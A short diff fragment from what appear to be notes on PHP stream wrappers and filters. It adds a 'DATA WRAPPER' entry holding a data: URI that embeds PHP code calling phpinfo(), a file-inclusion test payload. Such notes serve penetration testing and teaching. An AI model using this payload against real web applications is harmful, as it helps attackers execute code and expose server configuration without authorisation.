@@ -17,4 +17,13 @@ and Encryption Filters (mcrypt, and mdecrypt) which is now deprecated.
 
 
 
+DATA WRAPPER:
+
+data:text/plain,<?php%20phpinfo();%20?>
+
+
+
+
+
+
 
